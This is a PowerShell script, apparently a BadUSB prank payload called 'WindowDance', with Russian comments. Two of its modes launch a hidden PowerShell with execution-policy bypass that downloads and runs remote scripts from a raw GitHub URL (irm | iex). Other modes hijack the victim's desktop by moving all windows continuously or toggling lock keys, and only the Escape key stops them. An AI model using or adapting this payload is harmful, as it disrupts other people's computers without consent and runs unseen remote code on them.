param (
    [string]$mode = "kill"
)

if (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable()) { exit }

$currentTag = "WindowDance_Instance"
$host.ui.RawUI.WindowTitle = $currentTag

function Stop-AllDances {
    [void](Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
        $_.MainWindowTitle -eq $currentTag -and $_.Id -ne $PID 
    } | Stop-Process -Force)
}

if ($mode -eq "kill" -or $mode -eq "stop") { Stop-AllDances; exit }
Stop-AllDances

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try { ([System.Diagnostics.Process]::GetCurrentProcess()).PriorityClass = if($isAdmin){"High"}else{"AboveNormal"} } catch{}

Add-Type -AssemblyName System.Windows.Forms
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtInfo);
    public struct RECT { public int Left, Top, Right, Bottom; }
}
"@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

$SWP_FLAGS = 0x0001 -bor 0x0004 -bor 0x0010 -bor 0x4000
$workArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
$lastScan = 0; $cachedWindows = @()

# --- РЕЖИМЫ ---

# 1. Physics (Рогатка)
if ($mode -eq "physics") {
   powershell -nop -w h -ep bypass -c "irm 'https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main/WindowDance-physics.ps1'|iex"
}

# 2. Circle (Хоровод)
elseif ($mode -eq "circle") {
    powershell -nop -w h -ep bypass -c "irm 'https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main/WindowDance-circle.ps1'|iex"
}

# 3. Sinus (Прыжки)
elseif ($mode -eq "sinus") {
    $t = 0; $jumpH = $workArea.Height/3
    while($true) {
        if ([WinApi]::GetAsyncKeyState(0x1B) -ne 0) { break }
        if ([Environment]::TickCount -gt $lastScan + 2000) { $cachedWindows = [System.Diagnostics.Process]::GetProcesses() | Where-Object { $_.MainWindowHandle -ne 0 }; $lastScan = [Environment]::TickCount }
        foreach ($p in $cachedWindows) {
            try {
                $hwnd = $p.MainWindowHandle; if ($hwnd -eq 0) { continue }
                $phase = $p.Id*0.1; $factor = [Math]::Pow([Math]::Abs([Math]::Sin($t + $phase)), 1.3)
                $nx = ($p.Id*150)%($workArea.Width-400); $ny = ($workArea.Height-350)-($factor*$jumpH)
                [void][WinApi]::SetWindowPos($hwnd, 0, [int]$nx, [int]$ny, 0, 0, $SWP_FLAGS)
            } catch {continue}
        }
        $t += 0.08; [System.Threading.Thread]::Sleep(10)
    }
}

# 4. Caps (Танец клавиш)
elseif ($mode -eq "caps") {
    $keys = @(0x14, 0x90, 0x91) # Caps, Num, Scroll
    while($true) {
        if ([WinApi]::GetAsyncKeyState(0x1B) -ne 0) { break }
        foreach ($key in $keys) {
            [WinApi]::keybd_event($key, 0, 0, [UIntPtr]::Zero)
            [WinApi]::keybd_event($key, 0, 0x0002, [UIntPtr]::Zero)
            [System.Threading.Thread]::Sleep(100)
        }
    }
}

# 5. Chaos (Землетрясение)
elseif ($mode -eq "chaos") {
    while($true) {
        if ([WinApi]::GetAsyncKeyState(0x1B) -ne 0) { break }
        if ([Environment]::TickCount -gt $lastScan + 2000) { $cachedWindows = [System.Diagnostics.Process]::GetProcesses() | Where-Object { $_.MainWindowHandle -ne 0 }; $lastScan = [Environment]::TickCount }
        foreach ($p in $cachedWindows) {
            try {
                $hwnd = $p.MainWindowHandle; if ($hwnd -eq 0) { continue }
                $rx = (Get-Random -Min -10 -Max 11); $ry = (Get-Random -Min -10 -Max 11)
                $rect = New-Object WinApi+RECT; [void][WinApi]::GetWindowRect($hwnd, [ref]$rect)
                [void][WinApi]::SetWindowPos($hwnd, 0, $rect.Left + $rx, $rect.Top + $ry, 0, 0, $SWP_FLAGS)
            } catch {continue}
        }
        [System.Threading.Thread]::Sleep(5)
    }
}
